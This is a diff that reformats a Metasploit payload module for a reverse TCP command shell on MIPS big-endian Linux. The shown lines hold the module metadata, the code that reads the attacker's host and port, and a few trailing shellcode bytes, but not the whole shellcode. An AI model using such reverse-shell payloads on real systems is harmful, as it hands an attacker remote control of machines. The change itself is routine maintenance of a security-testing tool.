@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 184
 
   include Msf::Payload::Single
@@ -18,34 +18,32 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and spawn a command shell',
-      'Author'        =>
-        [
-          'rigan <imrigan[at]gmail.com>', # Original shellcode
-          'juan vazquez' # Metasploit module
-        ],
-      'References'    =>
-        [
-          ['EDB', '18226']
-        ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_MIPSBE,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShellUnix,
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        })
+                     'Name'          => 'Linux Command Shell, Reverse TCP Inline',
+                     'Description'   => 'Connect back to attacker and spawn a command shell',
+                     'Author'        =>
+                       [
+                         'rigan <imrigan[at]gmail.com>', # Original shellcode
+                         'juan vazquez' # Metasploit module
+                       ],
+                     'References'    =>
+                       [
+                         ['EDB', '18226']
+                       ],
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'linux',
+                     'Arch'          => ARCH_MIPSBE,
+                     'Handler'       => Msf::Handler::ReverseTcp,
+                     'Session'       => Msf::Sessions::CommandShellUnix,
+                     'Payload'       =>
+                       {
+                         'Offsets' => {},
+                         'Payload' => ''
+                       })
     )
   end
 
   def generate
-    if( !datastore['LHOST'] or datastore['LHOST'].empty? )
-      return super
-    end
+    return super if !datastore['LHOST'] || datastore['LHOST'].empty?
 
     host = Rex::Socket.addr_atoi(datastore['LHOST'])
     port = Integer(datastore['LPORT'])
@@ -117,9 +115,8 @@ module MetasploitModule
       "\xaf\xa0\xff\xfc" + # sw zero,-4(sp)
       "\x27\xa5\xff\xf8" + # addiu a1,sp,-8
       "\x24\x02\x0f\xab" + # li v0,4011 # sys_execve
-      "\x01\x01\x01\x0c"  # syscall 0x40404
+      "\x01\x01\x01\x0c" # syscall 0x40404
 
-    return super + shellcode
+    super + shellcode
   end
-
 end
